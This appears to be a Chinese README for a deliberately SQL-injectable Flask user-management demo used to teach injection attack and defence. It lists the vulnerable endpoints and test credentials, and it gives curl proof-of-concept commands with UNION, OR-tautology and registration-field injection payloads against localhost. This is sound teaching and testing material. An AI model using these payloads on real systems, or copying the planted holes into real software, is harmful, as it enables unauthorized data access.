# SQL注入 POC测试 — Flask 用户管理系统

一个包含 SQL 注入漏洞的 Flask 用户管理平台，用于演示 SQL 注入攻击与防御。

## 功能

- 登录（/login）
- 注册（/register）— 存在 SQL 注入
- 搜索（/search）— 存在 SQL 注入

## 快速启动

```bash
pip install flask
python3 app.py
# 访问 http://127.0.0.1:5000
```

## 测试账号

| 用户名 | 密码 | 角色 |
|--------|------|------|
| admin | admin123 | 管理员 |
| alice | alice2025 | 普通用户 |

## POC 测试

```bash
# 1. 登录
curl http://127.0.0.1:5000/login -d "username=admin&password=admin123" -c /tmp/cookies.txt

# 2. UNION注入
curl "http://127.0.0.1:5000/search?keyword=%27%20UNION%20SELECT%201,%27inj%27,%27inj_pass%27,%27inj@x.com%27,%27138%27--%20" -b /tmp/cookies.txt

# 3. OR注入
curl "http://127.0.0.1:5000/search?keyword=%27%20OR%20%271%27%3D%271" -b /tmp/cookies.txt

# 4. 注册注入
curl http://127.0.0.1:5000/register -d "username=hacker', 'pass', 'h@x.com', '123')--" -d "password=irrelevant"
```
